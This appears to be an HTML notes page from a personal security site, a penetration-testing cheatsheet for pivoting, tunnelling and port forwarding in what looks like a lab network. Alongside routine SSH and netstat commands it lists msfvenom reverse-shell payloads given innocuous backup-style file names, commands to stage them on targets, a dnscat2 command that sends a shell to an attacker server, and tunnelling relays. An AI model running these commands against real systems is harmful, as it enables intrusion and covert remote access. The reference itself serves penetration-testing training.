@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Command reference for pivoting, SSH tunnelling, SOCKS proxies and port forwarding." />
+<meta name="keywords" content="homepage, blog, pivoting, tunnelling, port-forwarding" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/notes/cheatsheet/pivoting-tunnelling-and-port-forwarding/" />
+
+
+    <title>
+        
+            Pivoting, Tunnelling and Port Forwarding :: 0xdad0  — 0xdad0
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.da8530b2f6a1f8f5fdcc56865db59dbabe588fac33c6eb25b40b90ceb85e5172.css" integrity="sha256-2oUwsvah&#43;PX9zFaGXbWdur5Yj6wzxusltAuQzrheUXI=" crossorigin="anonymous">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="css/styles.css">
+    
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Pivoting, Tunnelling and Port Forwarding">
+  <meta itemprop="description" content="Command reference for pivoting, SSH tunnelling, SOCKS proxies and port forwarding.">
+  <meta itemprop="datePublished" content="2026-09-03T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-09-03T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1601">
+  <meta itemprop="image" content="/img/hello.jpg">
+  <meta itemprop="keywords" content="Pivoting,Tunnelling,Port-Forwarding">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="/img/hello.jpg">
+  <meta name="twitter:title" content="Pivoting, Tunnelling and Port Forwarding">
+  <meta name="twitter:description" content="Command reference for pivoting, SSH tunnelling, SOCKS proxies and port forwarding.">
+
+
+
+    <meta property="og:url" content="/notes/cheatsheet/pivoting-tunnelling-and-port-forwarding/">
+  <meta property="og:site_name" content="0xdad0">
+  <meta property="og:title" content="Pivoting, Tunnelling and Port Forwarding">
+  <meta property="og:description" content="Command reference for pivoting, SSH tunnelling, SOCKS proxies and port forwarding.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2026-09-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-09-03T00:00:00+00:00">
+    <meta property="article:tag" content="Pivoting">
+    <meta property="article:tag" content="Tunnelling">
+    <meta property="article:tag" content="Port-Forwarding">
+    <meta property="og:image" content="/img/hello.jpg">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-09-03 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/notes.css">
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                0xdad0</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Blog</a></li><li><a href="/notes/">Notes</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+<div class="notes-shell">
+  <input type="checkbox" id="notes-sidebar-toggle" class="notes-sidebar-toggle" aria-hidden="true">
+  <aside class="notes-sidebar">
+    
+
+
+
+
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+
+
+
+
+
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+
+
+<div class="notes-sidebar-inner" data-index-url="/notes-search-index.json">
+  <input type="search" class="notes-search" placeholder="Search notes" aria-label="Search notes by title or tag" autocomplete="off" spellcheck="false">
+  <div class="notes-search-results" hidden></div>
+
+  <ul class="notes-tree">
+    
+      
+        
+          
+          
+            
+              
+            
+              
+            
+          
+          <li class="notes-tree-item">
+            <input type="checkbox" class="notes-tree-toggle" id="notes-ch-active-directory" aria-hidden="true">
+            <div class="notes-tree-head">
+              <label for="notes-ch-active-directory" class="notes-tree-caret"><span class="screen-reader-text">Toggle Active Directory</span></label>
+              <a href="/notes/active-directory/" class="notes-tree-section">Active Directory</a>
+              <span class="notes-tree-count">2</span>
+            </div>
+            <ul class="notes-tree">
+              
+                <li class="notes-tree-item">
+                  <a href="/notes/active-directory/dacl-abuse/" class="notes-tree-link">🛠️ ACL/ACE Abuse</a>
+                </li>
+              
+                <li class="notes-tree-item">
+                  <a href="/notes/active-directory/adcs/" class="notes-tree-link">🛠️ ADCS Abusing</a>
+                </li>
+              
+              
+            </ul>
+          </li>
+        
+      
+        
+          
+          
+            
+              
+            
+              
+            
+              
+            
+          
+          <li class="notes-tree-item">
+            <input type="checkbox" class="notes-tree-toggle" id="notes-ch-android" aria-hidden="true">
+            <div class="notes-tree-head">
+              <label for="notes-ch-android" class="notes-tree-caret"><span class="screen-reader-text">Toggle Android</span></label>
+              <a href="/notes/android/" class="notes-tree-section">Android</a>
+              <span class="notes-tree-count">3</span>
+            </div>
+            <ul class="notes-tree">
+              
+                <li class="notes-tree-item">
+                  <a href="/notes/android/frida-basics/" class="notes-tree-link">Frida Hooking Basics</a>
+                </li>
+              
+                <li class="notes-tree-item">
+                  <a href="/notes/android/objection/" class="notes-tree-link">Objection Quick Reference</a>
+                </li>
+              
+                <li class="notes-tree-item">
+                  <a href="/notes/android/ssl-kill-switch-lsposed/" class="notes-tree-link">SSL Kill Switch LSPosed</a>
+                </li>
+              
+              
+            </ul>
+          </li>
+        
+      
+        
+          
+          
+            
+              
+            
+          
+          <li class="notes-tree-item">
+            <input type="checkbox" class="notes-tree-toggle" id="notes-ch-cheatsheet" checked aria-hidden="true">
+            <div class="notes-tree-head">
+              <label for="notes-ch-cheatsheet" class="notes-tree-caret"><span class="screen-reader-text">Toggle Cheatsheets</span></label>
+              <a href="/notes/cheatsheet/" class="notes-tree-section">Cheatsheets</a>
+              <span class="notes-tree-count">1</span>
+            </div>
+            <ul class="notes-tree">
+              
+                <li class="notes-tree-item">
+                  <a href="/notes/cheatsheet/pivoting-tunnelling-and-port-forwarding/" class="notes-tree-link notes-tree-active">Pivoting, Tunnelling and Port Forwarding</a>
+                </li>
+              
+              
+            </ul>
+          </li>
+        
+      
+        
+          
+          
+            
+              
+            
+              
+            
+          
+          <li class="notes-tree-item">
+            <input type="checkbox" class="notes-tree-toggle" id="notes-ch-web" aria-hidden="true">
+            <div class="notes-tree-head">
+              <label for="notes-ch-web" class="notes-tree-caret"><span class="screen-reader-text">Toggle Web</span></label>
+              <a href="/notes/web/" class="notes-tree-section">Web</a>
+              <span class="notes-tree-count">2</span>
+            </div>
+            <ul class="notes-tree">
+              
+                <li class="notes-tree-item">
+                  <a href="/notes/web/jwt-attacks/" class="notes-tree-link">JWT Attacks</a>
+                </li>
+              
+                <li class="notes-tree-item">
+                  <a href="/notes/web/sql-injection/" class="notes-tree-link">SQL Injection Cheatsheet</a>
+                </li>
+              
+              
+            </ul>
+          </li>
+        
+      
+
+      
+        
+        
+      
+        
+        
+      
+        
+        
+      
+        
+        
+      
+        
+        
+      
+        
+        
+      
+        
+        
+      
+        
+        
+      
+    
+  </ul>
+</div>
+  </aside>
+  <label for="notes-sidebar-toggle" class="notes-sidebar-overlay" aria-hidden="true"></label>
+
+  <main class="notes-main">
+    <article class="notes-article">
+      <nav class="notes-breadcrumb" aria-label="Breadcrumb">
+        
+          <a href="/">0xdad0</a>
+          <span class="notes-breadcrumb-sep">/</span>
+        
+          <a href="/notes/">Notes</a>
+          <span class="notes-breadcrumb-sep">/</span>
+        
+          <a href="/notes/cheatsheet/">Cheatsheets</a>
+          <span class="notes-breadcrumb-sep">/</span>
+        
+        <span class="notes-breadcrumb-current">Pivoting, Tunnelling and Port Forwarding</span>
+      </nav>
+
+      <h1 class="notes-article-title">Pivoting, Tunnelling and Port Forwarding</h1>
+
+      
+        <p class="notes-article-lead">Command reference for pivoting, SSH tunnelling, SOCKS proxies and port forwarding.</p>
+      
+
+      <div class="notes-content">
+        <table>
+  <thead>
+      <tr>
+          <th>Command</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>ifconfig</code></td>
+          <td>Linux-based command that displays all current network configurations of a system.</td>
+      </tr>
+      <tr>
+          <td><code>ipconfig</code></td>
+          <td>Windows-based command that displays all system network configurations.</td>
+      </tr>
+      <tr>
+          <td><code>netstat -r</code></td>
+          <td>Command used to display the routing table for all IPv4-based protocols.</td>
+      </tr>
+      <tr>
+          <td><code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></td>
+          <td>Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</td>
+      </tr>
+      <tr>
+          <td><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></td>
+          <td>SSH comand used to create an SSH tunnel from a local machine on local port <code>1234</code> to a remote target using port 3306.</td>
+      </tr>
+      <tr>
+          <td><code>netstat -antp | grep 1234</code></td>
+          <td>Netstat option used to display network connections associated with a tunnel created. Using <code>grep</code> to filter based on local port <code>1234</code> .</td>
+      </tr>
+      <tr>
+          <td><code>nmap -v -sV -p1234 localhost</code></td>
+          <td>Nmap command used to scan a host through a connection that has been made on local port <code>1234</code>.</td>
+      </tr>
+      <tr>
+          <td><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
+          <td>SSH command that instructs the ssh client to request the SSH server forward all data via port <code>1234</code> to <code>localhost:3306</code>.</td>
+      </tr>
+      <tr>
+          <td><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
+          <td>SSH command used to perform a dynamic port forward on port <code>9050</code> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</td>
+      </tr>
+      <tr>
+          <td><code>tail -4 /etc/proxychains.conf</code></td>
+          <td>Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.</td>
+      </tr>
+      <tr>
+          <td><code>proxychains nmap -v -sn 172.16.5.1-200</code></td>
+          <td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range <code>172.16.5.1-200</code> with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>).</td>
+      </tr>
+      <tr>
+          <td><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></td>
+          <td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>).</td>
+      </tr>
+      <tr>
+          <td><code>proxychains msfconsole</code></td>
+          <td>Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</td>
+      </tr>
+      <tr>
+          <td><code>msf6 &gt; search rdp_scanner</code></td>
+          <td>Metasploit search that attempts to find a module called <code>rdp_scanner</code>.</td>
+      </tr>
+      <tr>
+          <td><code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code></td>
+          <td>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</td>
+      </tr>
+      <tr>
+          <td><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></td>
+          <td>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.</td>
+      </tr>
+      <tr>
+          <td><code>msf6 &gt; use exploit/multi/handler</code></td>
+          <td>Used to select the multi-handler exploit module in Metasploit.</td>
+      </tr>
+      <tr>
+          <td><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></td>
+          <td>Uses secure copy protocol (<code>scp</code>) to transfer the file <code>backupscript.exe</code> to the specified host and places it in the Ubuntu user&rsquo;s home directory (<code>:~/</code>).</td>
+      </tr>
+      <tr>
+          <td><code>python3 -m http.server 8123</code></td>
+          <td>Uses Python3 to start a simple HTTP server listening on port <code>8123</code>. Can be used to retrieve files from a host.</td>
+      </tr>
+      <tr>
+          <td><code>Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></td>
+          <td>PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after <code>-OutFile</code>.</td>
+      </tr>
+      <tr>
+          <td><code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></td>
+          <td>SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port <code>8080</code> on the attack host to port <code>80</code> on the target.</td>
+      </tr>
+      <tr>
+          <td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></td>
+          <td>Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after <code>LHOST=</code> on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob.</td>
+      </tr>
+      <tr>
+          <td><code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></td>
+          <td>Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>).</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done</code></td>
+          <td>For Loop used on a Linux-based system to discover devices in a specified network segment.</td>
+      </tr>
+      <tr>
+          <td><code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;</code></td>
+          <td>For Loop used on a Windows-based system to discover devices in a specified network segment.</td>
+      </tr>
+      <tr>
+          <td><code>1..254 | % {&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;}</code></td>
+          <td>PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.</td>
+      </tr>
+      <tr>
+          <td><code>msf6 &gt; use auxiliary/server/socks_proxy</code></td>
+          <td>Metasploit command that selects the <code>socks_proxy</code> auxiliary module.</td>
+      </tr>
+      <tr>
+          <td><code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code></td>
+          <td>Metasploit command that lists all currently running jobs.</td>
+      </tr>
+      <tr>
+          <td><code>socks4 127.0.0.1 9050</code></td>
+          <td>Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</td>
+      </tr>
+      <tr>
+          <td><code>Socks5 127.0.0.1 1080</code></td>
+          <td>Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.</td>
+      </tr>
+      <tr>
+          <td><code>msf6 &gt; use post/multi/manage/autoroute</code></td>
+          <td>Metasploit command used to select the autoroute module.</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>meterpreter &gt; help portfwd</code></td>
+          <td>Meterpreter command used to display the features of the portfwd command.</td>
+      </tr>
+      <tr>
+          <td><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></td>
+          <td>Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</td>
+      </tr>
+      <tr>
+          <td><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></td>
+          <td>Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</td>
+      </tr>
+      <tr>
+          <td><code>netstat -antp</code></td>
+          <td>Used to display all (<code>-a</code>) active network connections with associated process IDs. <code>-t</code> displays only TCP connections.<code>-n</code> displays only numerical addresses. <code>-p</code> displays process IDs associated with each displayed connection.</td>
+      </tr>
+      <tr>
+          <td><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></td>
+          <td>Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port <code>1234</code> listening on the IP address of the Attack Host.</td>
+      </tr>
+      <tr>
+          <td><code>meterpreter &gt; bg</code></td>
+          <td>Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</td>
+      </tr>
+      <tr>
+          <td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></td>
+          <td>Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</td>
+      </tr>
+      <tr>
+          <td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></td>
+          <td>Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</td>
+      </tr>
+      <tr>
+          <td><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
+          <td>Windows-based command that uses PuTTY&rsquo;s Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</td>
+      </tr>
+      <tr>
+          <td><code>sudo apt-get install sshuttle</code></td>
+          <td>Uses apt-get to install the tool sshuttle.</td>
+      </tr>
+      <tr>
+          <td><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></td>
+          <td>Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>).</td>
+      </tr>
+      <tr>
+          <td><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></td>
+          <td>Clones the rpivot project GitHub repository.</td>
+      </tr>
+      <tr>
+          <td><code>sudo apt-get install python2.7</code></td>
+          <td>Uses apt-get to install python2.7.</td>
+      </tr>
+      <tr>
+          <td><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></td>
+          <td>Used to run the rpivot server (<code>server.py</code>) on proxy port <code>9050</code>, server port <code>9999</code> and listening on any IP address (<code>0.0.0.0</code>).</td>
+      </tr>
+      <tr>
+          <td><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></td>
+          <td>Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</td>
+      </tr>
+      <tr>
+          <td><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></td>
+          <td>Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port.</td>
+      </tr>
+      <tr>
+          <td><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></td>
+          <td>Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</td>
+      </tr>
+      <tr>
+          <td><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></td>
+          <td>Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</td>
+      </tr>
+      <tr>
+          <td><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></td>
+          <td>Windows-based command that uses <code>netsh.exe</code> to configure a portproxy rule called <code>v4tov4</code> that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</td>
+      </tr>
+      <tr>
+          <td><code>netsh.exe interface portproxy show v4tov4</code></td>
+          <td>Windows-based command used to view the configurations of a portproxy rule called v4tov4.</td>
+      </tr>
+      <tr>
+          <td><code>git clone https://github.com/iagox86/dnscat2.git</code></td>
+          <td>Clones the <code>dnscat2</code> project GitHub repository.</td>
+      </tr>
+      <tr>
+          <td><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></td>
+          <td>Used to start the dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain <code>inlanefreight.local</code> with the no-cache option enabled.</td>
+      </tr>
+      <tr>
+          <td><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></td>
+          <td>Clones the dnscat2-powershell project Github repository.</td>
+      </tr>
+      <tr>
+          <td><code>Import-Module dnscat2.ps1</code></td>
+          <td>PowerShell command used to import the dnscat2.ps1 tool.</td>
+      </tr>
+      <tr>
+          <td><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></td>
+          <td>PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec cmd</code>).</td>
+      </tr>
+      <tr>
+          <td><code>dnscat2&gt; ?</code></td>
+          <td>Used to list dnscat2 options.</td>
+      </tr>
+      <tr>
+          <td><code>dnscat2&gt; window -i 1</code></td>
+          <td>Used to interact with an established dnscat2 session.</td>
+      </tr>
+      <tr>
+          <td><code>./chisel server -v -p 1234 --socks5</code></td>
+          <td>Used to start a chisel server in verbose mode listening on port <code>1234</code> using SOCKS version 5.</td>
+      </tr>
+      <tr>
+          <td><code>./chisel client -v 10.129.202.64:1234 socks</code></td>
+          <td>Used to connect to a chisel server at the specified IP address &amp; port using socks.</td>
+      </tr>
+      <tr>
+          <td><code>git clone https://github.com/utoni/ptunnel-ng.git</code></td>
+          <td>Clones the ptunnel-ng project GitHub repository.</td>
+      </tr>
+      <tr>
+          <td><code>sudo ./autogen.sh</code></td>
+          <td>Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</td>
+      </tr>
+      <tr>
+          <td><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></td>
+          <td>Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>).</td>
+      </tr>
+      <tr>
+          <td><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></td>
+          <td>Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>).</td>
+      </tr>
+      <tr>
+          <td><code>ssh -p2222 -lubuntu 127.0.0.1</code></td>
+          <td>SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</td>
+      </tr>
+      <tr>
+          <td><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></td>
+          <td>Windows-based command used to register the SocksOverRDP-PLugin.dll.</td>
+      </tr>
+      <tr>
+          <td><code>netstat -antb |findstr 1080</code></td>
+          <td>Windows-based command used to list TCP network connections listening on port 1080.</td>
+      </tr>
+  </tbody>
+</table>
+
+      </div>
+    </article>
+
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+      
+      
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+  <nav class="notes-prevnext">
+    
+      <a class="notes-prevnext-prev" href="/notes/android/objection/">
+        <span class="notes-prevnext-title">← Objection Quick Reference</span>
+      </a>
+    
+    
+      <a class="notes-prevnext-next" href="/notes/web/sql-injection/">
+        <span class="notes-prevnext-title">SQL Injection Cheatsheet →</span>
+      </a>
+    
+  </nav>
+
+  </main>
+
+  
+    <aside class="notes-toc">
+      <div class="notes-toc-title">Table of Contents</div>
+      <nav id="TableOfContents"></nav>
+    </aside>
+  
+</div>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+
+
+  
+  
+    
+    <script type="text/javascript" src="/js/notes.dc95e1b7d6df472ba4abe4c2f256ca2a1796df602cfc8291d765ae474d04252477d04a75ea17b0a358a49749331c58341aa4eaefab7f571162cb3a729ae607a0.js" integrity="sha512-3JXht9bfRyukq&#43;TC8lbKKheW32As/IKR12WuR00EJSR30Ep16hewo1ikl0kzHFg0GqTq76t/VxFiyzpymuYHoA=="></script>
+  
+
+    </body>
+</html>
